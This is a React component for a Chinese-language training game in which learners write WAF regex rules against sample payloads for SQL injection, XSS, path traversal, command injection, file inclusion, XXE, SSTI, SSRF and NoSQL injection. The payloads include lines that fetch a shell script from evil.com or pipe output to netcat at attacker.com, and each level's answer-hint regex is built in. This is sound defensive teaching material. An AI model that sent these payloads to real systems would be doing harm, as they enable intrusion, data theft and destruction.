import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Shield, CheckCircle } from 'lucide-react';
import { Card, Button } from '../../components/UI';

export const WAFRulesBuilder: React.FC = () => {
  const [level, setLevel] = useState(1);
  const [rule, setRule] = useState('');
  const [result, setResult] = useState('');
  const [solved, setSolved] = useState<Set<number>>(new Set());

  const challenges = [
    { id:1, title:'拦截SQL注入', desc:'编写正则拦截包含 UNION SELECT 的请求', payloads:["1 UNION SELECT * FROM users","1' UNION SELECT 1,2,3--","1 union select password from admin"], answerHint: '(?i)union.*select' },
    { id:2, title:'拦截XSS脚本', desc:'编写正则拦截 <script> 标签', payloads:['<script>alert(1)</script>','<SCRIPT>alert("xss")</SCRIPT>','<script src="evil.js">'], answerHint: '(?i)<script' },
    { id:3, title:'拦截路径遍历', desc:'拦截 ../ 路径遍历攻击', payloads:['../../../etc/passwd','..\\..\\windows\\system32','....//....//etc/passwd'], answerHint: '\\.\\./' },
    { id:4, title:'拦截命令注入', desc:'拦截 | ; && 命令分隔符', payloads:['127.0.0.1;cat /etc/passwd','google.com && wget evil.com/shell.sh','whoami | nc attacker.com 4444'], answerHint: '[;&|]' },
    { id:5, title:'拦截文件包含', desc:'拦截 php:// 和 expect:// 等协议', payloads:['php://filter/convert.base64-encode/resource=index.php','expect://id','data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='], answerHint: '(?:php|expect|data)://' },
    { id:6, title:'拦截XXE攻击', desc:'拦截 <!DOCTYPE 和 <!ENTITY', payloads:['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>','<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;'], answerHint: '<!DOCTYPE|<!(?:ELEMENT|ENTITY)' },
    { id:7, title:'拦截SSTI模板注入', desc:'拦截 Jinja2/Twig 模板注入语法', payloads:['{{7*7}}','${7*7}','<%= 7*7 %>'], answerHint: '\\{\\{|\\$\\{|<%=' },
    { id:8, title:'拦截SSRF攻击', desc:'拦截内网IP地址请求', payloads:['http://127.0.0.1/admin','http://10.0.0.1:8080','http://169.254.169.254/latest/meta-data/'], answerHint: '127\\.0\\.0\\.1|10\\.|172\\.(?:1[6-9]|2\\d|3[01])\\.|192\\.168\\.' },
    { id:9, title:'拦截NoSQL注入', desc:'拦截MongoDB $where $regex $gt $ne 操作符', payloads:['{"$gt":""}','{"$regex":"^admin"}','{"$where":"1==1"}'], answerHint: '\\$(?:gt|regex|where|ne|eq|lt)' },
    { id:10, title:'综合WAF', desc:'编写规则同时拦截SQL注入和XSS', payloads:["1' OR '1'='1","<img src=x onerror=alert(1)>","'; DROP TABLE users;--","<svg onload=alert(1)>"], answerHint: "(?i)(union.*select|select.*from|<script|<img.*onerror|<svg.*onload|drop\\s+table)" },
  ];

  const currentChallenge = challenges[level - 1];

  const handleTest = () => {
    if (!rule.trim()) { setResult('请输入正则规则'); return; }
    try {
      const regex = new RegExp(rule, 'i');
      const results = currentChallenge.payloads.map(p => {
        const matched = regex.test(p);
        return `${matched ? '✅' : '❌'} ${p}`;
      });
      const allMatched = currentChallenge.payloads.every(p => regex.test(p));
      setResult(results.join('\n'));
      if (allMatched) {
        const newSolved = new Set(solved);
        newSolved.add(level);
        setSolved(newSolved);
      }
    } catch {
      setResult('❌ 正则表达式语法错误');
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2 overflow-x-auto pb-2">
        {challenges.map(c => (
          <button key={c.id} onClick={() => { setLevel(c.id); setRule(''); setResult(''); }}
            className={`flex-shrink-0 w-10 h-10 rounded-lg flex items-center justify-center text-sm font-medium transition ${
              solved.has(c.id) ? 'bg-green-500 text-white' :
              level===c.id ? 'bg-cyan-500 text-white' : 'bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20'}`}>
            {solved.has(c.id) ? <CheckCircle size={16}/> : c.id}
          </button>
        ))}
      </div>
      <Card className="border-cyan-500/20">
        <h3 className="text-cyan-400 font-medium mb-1">第{level}关: {currentChallenge.title}</h3>
        <p className="text-sm text-gray-400 mb-3">{currentChallenge.desc}</p>
        <div className="mb-3">
          <p className="text-xs text-gray-500 mb-2">📋 测试Payloads:</p>
          <div className="space-y-1">
            {currentChallenge.payloads.map((p,i) => (
              <code key={i} className="block p-2 bg-black/50 rounded text-xs text-red-300 font-mono">{p}</code>
            ))}
          </div>
        </div>
        <div className="flex gap-2 mb-3">
          <input value={rule} onChange={e => setRule(e.target.value)}
            onKeyDown={e => e.key==='Enter' && handleTest()}
            placeholder="输入正则表达式规则..."
            className="flex-1 px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-cyan-500 font-mono"/>
          <Button onClick={handleTest} className="!bg-cyan-500 !text-black hover:!bg-cyan-400">
            <Shield size={16}/> 测试
          </Button>
        </div>
        {!solved.has(level) && (
          <button onClick={() => setRule(currentChallenge.answerHint)}
            className="text-xs text-gray-500 hover:text-cyan-400 transition">💡 查看提示 (使用推荐的答案模式)</button>
        )}
        {result && (
          <pre className="p-3 bg-black/50 rounded-lg text-xs text-gray-300 whitespace-pre-wrap border border-gray-700 font-mono mt-3">{result}</pre>
        )}
        {solved.has(level) && (
          <motion.div initial={{opacity:0,y:10}} animate={{opacity:1,y:0}}
            className="mt-3 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-center gap-2">
            <CheckCircle size={16} className="text-green-400"/>
            <span className="text-green-400 text-sm">🎉 通关！所有payload已被成功拦截</span>
          </motion.div>
        )}
      </Card>
    </div>
  );
};
